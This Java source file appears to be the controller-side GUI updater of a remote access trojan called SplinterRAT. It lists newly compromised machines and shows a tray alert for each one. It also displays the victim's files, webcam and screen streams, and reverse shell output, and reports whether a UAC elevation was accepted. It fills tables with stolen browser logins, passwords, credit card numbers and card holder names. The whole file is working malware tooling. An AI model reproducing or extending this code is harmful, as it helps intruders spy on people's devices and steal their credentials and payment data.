package Utilities;

import Main.Main;
import Packets.Identificators.Response;
import Packets.SysNetInfo.Information;
import Packets.SysNetInfo.NetworkInformation;
import Packets.SysNetInfo.SystemInformation;
import ProgressBar.Bar;
import Server.ServerGUI;
import TableUtils.Credentials.CredentialsManagerGUI;
import Utils.Converter;
import TableUtils.FileManager.FileManagerGUI;
import TableUtils.ReverseShell.ReverseShellGUI;
import TableUtils.ScreenStreaming.ScreenStreamerGUI;
import TableUtils.WebcamManager.WebcamGUI;
import Updater.UpdaterInterface;
import org.json.JSONArray;
import org.json.JSONObject;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableModel;
import java.awt.*;
import java.util.*;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;
import java.util.function.Consumer;

public class SwingUpdater implements UpdaterInterface {

    private SystemInformation systemInformation;

    private NetworkInformation networkInformation;

    private FileManagerGUI fileManagerGUI;

    private WebcamGUI webcamGUI;

    private ScreenStreamerGUI screenStreamerGUI;

    private CredentialsManagerGUI credentialsManagerGUI;

    private ReverseShellGUI reverseShellGUI;

    private final ConcurrentHashMap<Byte, Bar<?>> mapOfProgressBars = new ConcurrentHashMap<>();

    private final WindowHandler<FileManagerGUI> fileManagerWindowHandler = new WindowHandler<>();

    private final Map<Response, Consumer<JSONObject>> mapOfResponses = new HashMap<>();

    public void closeFileManagerWindowHandler(byte id){
        fileManagerWindowHandler.finishInstance(id);
    }


    public SwingUpdater() {
        setupMapOfResponses();
    }



    private void setupMapOfResponses() {
        mapOfResponses.put(Response.SYS_NET_INFO, this::addRowOfNewConnection);
        mapOfResponses.put(Response.DISKS, this::updateDisks);
        mapOfResponses.put(Response.DIRECTORY, this::updateDirectory);
        mapOfResponses.put(Response.WEBCAM_DEVICES, this::updateWebcamDevices);
        mapOfResponses.put(Response.SCREEN_DIMENSIONS, this::setScreenDimensions);
        mapOfResponses.put(Response.MONITORS, this::updateMonitors);
        mapOfResponses.put(Response.SHELL, this::updateReverseShell);
        mapOfResponses.put(Response.PERMISSIONS, this::showPermissionStatus);
        mapOfResponses.put(Response.SHOW_DOWNLOADED, this::showDownloadedFiles);
        mapOfResponses.put(Response.DUMP_CREDENTIALS, this::updateCredentialsDumper);
        mapOfResponses.put(Response.PROGRESS_BAR, this::updateDownloadState);
    }

    public int getPositionOfExisting(String identifier, TableModel tableModel) {
        int rows = tableModel.getRowCount();
        for (int i  = 0; i < rows; i++){
            String value = String.valueOf(tableModel.getValueAt(i, 0));
            if (value.equals(identifier)){
                return i;
            }
        }
        return -1;
    }

    public void displayTray(String ip, String operativeSystem) {
        SystemTray tray = SystemTray.getSystemTray();
        Image image = new ImageIcon(Objects.requireNonNull(getClass().getClassLoader().getResource("splinter_icon_250x250.png"))).getImage();
        TrayIcon trayIcon = new TrayIcon(image, "SplinterRAT connection!");
        trayIcon.setImageAutoSize(true);
        trayIcon.setToolTip("New connection!");
        try {
            tray.add(trayIcon);
        } catch (AWTException e) {
            throw new RuntimeException(e);
        }

        trayIcon.displayMessage("SplinterRAT has a new connection!", "New connection from " + ip + " - " + operativeSystem, TrayIcon.MessageType.INFO);
    }

    public void addRowOfNewConnection(JSONObject jsonObject) {
        Information information = Converter.convertJSON2NetAndSysInfo(jsonObject);
        systemInformation = information.systemInformation();
        networkInformation = information.networkInformation();
        SwingUtilities.invokeLater(() -> {
            String identifier = systemInformation.UUID();
            TableModel tableModel = Main.gui.getConnectionsTable().getModel();
            int existingClientRow = getPositionOfExisting(identifier, tableModel); // position if exists in JTable
            if (existingClientRow != -1) {  // change state of connection
                tableModel.setValueAt("Connected", existingClientRow, tableModel.getColumnCount() - 1);
            } else { // new connection
                String[] tableRow = new String[]{
                        systemInformation.UUID(),
                        networkInformation.IP(),
                        networkInformation.USER_COUNTRY(),
                        systemInformation.TAG_NAME(),
                        systemInformation.USER_NAME(),
                        systemInformation.OPERATING_SYSTEM(),
                        "Connected"
                };
                DefaultTableModel defaultTableModel = (DefaultTableModel) tableModel;
                defaultTableModel.addRow(tableRow);
                Main.gui.updateNumOfConnectedClients();
            }
            if (ServerGUI.isNotifications() && SystemTray.isSupported()) {
                displayTray(networkInformation.IP(), systemInformation.OPERATING_SYSTEM());
            }
        });
    }

    public void updateDisks(JSONObject jsonObject) {
        JSONArray jsonArray = jsonObject.getJSONArray("disks");
        fileManagerGUI.addDisks(jsonArray.toList().stream()
                .map(Object::toString)
                .toList());
    }


    public void updateDirectory(JSONObject jsonObject) {
        JSONObject directory = jsonObject.getJSONObject("directory");
        String path = directory.getString("requested_directory");
        byte windowID = (byte) jsonObject.getInt("window_id");
        FileManagerGUI fileManagerGUI = fileManagerWindowHandler.getWindow(windowID);

        // Extrayendo carpetas y archivos desde el JSON.
        System.out.println(jsonObject);
        JSONObject directoryJson = jsonObject.getJSONObject("directory");
        JSONArray folders = directoryJson.getJSONArray("folders");
        JSONArray files = directoryJson.getJSONArray("files");

        // La posición donde los archivos comienzan en la tabla podría ser considerada
        // el "divider", ya que es donde se transiciona de mostrar carpetas a mostrar archivos.
        int divider = folders.length(); // +1 para incluir la fila de navegación ("...").

        SwingUtilities.invokeLater(() -> {
            if (directoryJson.has("error") && "ACCESS_DENIED".equals(directoryJson.getString("error"))) {
                JOptionPane.showMessageDialog(fileManagerGUI.getFileManagerDialog(), "Access denied to this folder",
                        "Access denied", JOptionPane.ERROR_MESSAGE);
                fileManagerGUI.getStack().pop();
            } else {
                fileManagerGUI.getPathField().setText(path);
                DefaultTableModel tableModel = (DefaultTableModel) fileManagerGUI.getTable().getModel();
                tableModel.setRowCount(0);

                // Agregando carpeta que permite navegar hacia arriba.
                tableModel.addRow(new String[]{"...", ""});

                // Agregando las carpetas al modelo de la tabla.
                for (int i = 0; i < folders.length(); i++) {
                    tableModel.addRow(new String[]{folders.getString(i), ""});
                }

                // Agregando los archivos al modelo de la tabla.
                for (int i = 0; i < files.length(); i++) {
                    JSONObject file = files.getJSONObject(i);
                    tableModel.addRow(new String[]{file.getString("name"), file.getString("size")});
                }

                // Si necesitas usar el "divider" en la lógica adicional...
                fileManagerGUI.setDivider(divider);

                fileManagerGUI.getScrollPane().getVerticalScrollBar().setValue(0);
            }
        });
    }


    private void disableButtons() {
        webcamGUI.getBoxOfDevices().setEnabled(false);
        webcamGUI.getStartButton().setEnabled(false);
        webcamGUI.getRecordButton().setEnabled(false);
        webcamGUI.getSnapshotButton().setEnabled(false);
        webcamGUI.getSaveRecordButton().setEnabled(false);
    }

    private void enableBasicButtons() {
        webcamGUI.getBoxOfDevices().setEnabled(true);
        webcamGUI.getStartButton().setEnabled(true);
        webcamGUI.getRecordButton().setEnabled(false);
        webcamGUI.getSnapshotButton().setEnabled(false);
        webcamGUI.getSaveRecordButton().setEnabled(false);
    }

    private void enableButtons() {
        if (webcamGUI.getBoxOfDevices().getSelectedIndex() != -1) {
            enableBasicButtons();
        } else {
            disableButtons();
        }
    }

    public void updateWebcamDevices(JSONObject jsonObject) {
        List<Object> listOfWebcams = jsonObject.getJSONArray("list_of_webcams").toList();
        SwingUtilities.invokeLater(() -> {
            if (listOfWebcams != null) {
                if (listOfWebcams.isEmpty()) {
                    disableButtons();
                    webcamGUI.getBoxOfDevices().addItem("No webcam found");
                } else {
                    for (Object listOfWebcam : listOfWebcams) {
                        webcamGUI.getBoxOfDevices().addItem((String) listOfWebcam);
                    }
                    enableButtons();
                }
            }
        });

    }

    public void updateFrameOfWebcamStreamer(byte[] data) {
        webcamGUI.setLastFrame(data);
        SwingUtilities.invokeLater(() -> {
            ImageIcon tempIMG = new ImageIcon(data);
            webcamGUI.getWebcamLabel().setIcon(tempIMG);
        });
    }

    public void updateReverseShell(JSONObject jsonObject) {
        JTextArea textArea = reverseShellGUI.getTextAreaOfResult();
        textArea.append(jsonObject.getString("result"));
        textArea.setCaretPosition(textArea.getDocument().getLength());

    }

    public void updateFrameOfScreenStreamer(byte[] finalData) {
        ImageIcon tempIMG = new ImageIcon(finalData);
        Image img = tempIMG.getImage();
        screenStreamerGUI.setLastData(finalData);
        Image imgScale = img.getScaledInstance(screenStreamerGUI.getVirtualScreen().getWidth(), screenStreamerGUI.getVirtualScreen().getHeight(), Image.SCALE_SMOOTH);
        SwingUtilities.invokeLater(() -> {
            screenStreamerGUI.getVirtualScreen().setIcon(new ImageIcon(imgScale));
        });
    }

    public void setScreenDimensions(JSONObject jsonObject) {
        List<Object> dimensions = jsonObject.getJSONArray("dimensions").toList();
        screenStreamerGUI.setOriginalScreenDimensions(
                Integer.parseInt(dimensions.get(0).toString()),
                Integer.parseInt(dimensions.get(1).toString())
        );
    }

    public void updateMonitors(JSONObject jsonObject) {
        List<Object> listOfMonitors = jsonObject.getJSONArray("list_of_monitors").toList();
        SwingUtilities.invokeLater(() -> {
            JComboBox<String> comboBox = screenStreamerGUI.getScreenSelector();
            for (Object e : listOfMonitors) {
                comboBox.addItem(e.toString());
            }
        });
    }

    public void updateCredentialsDumper(JSONObject jsonObject) {
        jsonObject = jsonObject.getJSONObject("info");
        JSONArray accountCredentialsArray = jsonObject.getJSONArray("accountCredentials");
        JSONArray creditCardCredentialsArray = jsonObject.getJSONArray("creditCardCredentials");
        SwingUtilities.invokeLater(() -> {
            for (int i = 0; i < accountCredentialsArray.length(); i++) {
                JSONObject e = accountCredentialsArray.getJSONObject(i);
                Object[] elements = {
                        e.getString("actionUrl"),
                        e.getString("originUrl"),
                        e.getString("username"),
                        e.getString("password"),
                        e.getLong("creationDate"),
                        e.getLong("lastUsedDate")
                };
                credentialsManagerGUI.getAccountsTableModel().addRow(elements);
            }
            for (int i = 0; i < creditCardCredentialsArray.length(); i++) {
                JSONObject e = creditCardCredentialsArray.getJSONObject(i);
                Object[] elements = {
                        e.getString("creditCardNumber"),
                        e.getInt("expirationMonth"),
                        e.getInt("expirationYear"),
                        e.getString("cardHolder")
                };
                credentialsManagerGUI.getCreditCardsTableModel().addRow(elements);
            }

            credentialsManagerGUI.getDumpAllJButton().setEnabled(true);
        });
    }


    public void showPermissionStatus(JSONObject jsonObject) {
        int result = jsonObject.getInt("result");
        SwingUtilities.invokeLater(() -> {
            switch (result) {
                case 1 -> System.out.println("Permissions acepted!");
                //new ClientErrorHandler(
                //"The client accepted admin privileges, restarting client with privileges.",
                //stream.getClientSocket(),
                //JOptionPane.INFORMATION_MESSAGE);
                case 0 -> JOptionPane.showMessageDialog(Main.gui.getMainGUI(),
                        "The client rejected the UAC prompt, no admin privileges where achieved.",
                        "Exception with client", JOptionPane.ERROR_MESSAGE);
                default -> JOptionPane.showMessageDialog(Main.gui.getMainGUI(),
                        "The client has admin privileges, no need to elevate.",
                        "Exception with client", JOptionPane.WARNING_MESSAGE);
            }
        });
    }

    public void processMessage(String message) {
        JSONObject object = new JSONObject(message);
        Consumer<JSONObject> action = mapOfResponses.get(Response.valueOf(object.getString("RESPONSE")));
        if (action != null) {
            action.accept(object);
        } else {
            System.out.println("Action not found!");
        }
    }

    @Override
    public boolean shouldExtract() {
        return true;
    }

    public void showDownloadedFiles(JSONObject jsonObject) {
        FolderOpener.open(jsonObject.getString("path"));
    }


    public void updateDownloadState(JSONObject jsonObject) {
        Bar<?> bar = mapOfProgressBars.get((byte)jsonObject.getInt("channel_id"));
        if (bar != null) bar.updateProgress(jsonObject.getInt("read_size"), jsonObject.getBoolean("is_last_packet"));
    }

    @Override
    public Information getInformation() {
        return null;
    }

    @Override
    public SystemInformation getSystemInformation() {
        return systemInformation;
    }

    @Override
    public NetworkInformation getNetworkInformation() {
        return networkInformation;
    }

    public void setFileManagerGUI(FileManagerGUI fileManagerGUI) {
        fileManagerWindowHandler.createInstanceAndGetID(fileManagerGUI);
        this.fileManagerGUI = fileManagerGUI;
    }

    public void setWebcamGUI(WebcamGUI webcamGUI) {
        this.webcamGUI = webcamGUI;
    }

    public void setScreenStreamerGUI(ScreenStreamerGUI screenStreamerGUI) {
        this.screenStreamerGUI = screenStreamerGUI;
    }

    public void addProgressBar(byte id, Bar<?> progressBar) {
        mapOfProgressBars.put(id, progressBar);
    }

    public void setCredentialsManagerGUI(CredentialsManagerGUI credentialsManagerGUI) {
        this.credentialsManagerGUI = credentialsManagerGUI;
    }

    public void setReverseShellGUI(ReverseShellGUI reverseShellGUI) {
        this.reverseShellGUI = reverseShellGUI;
    }
}
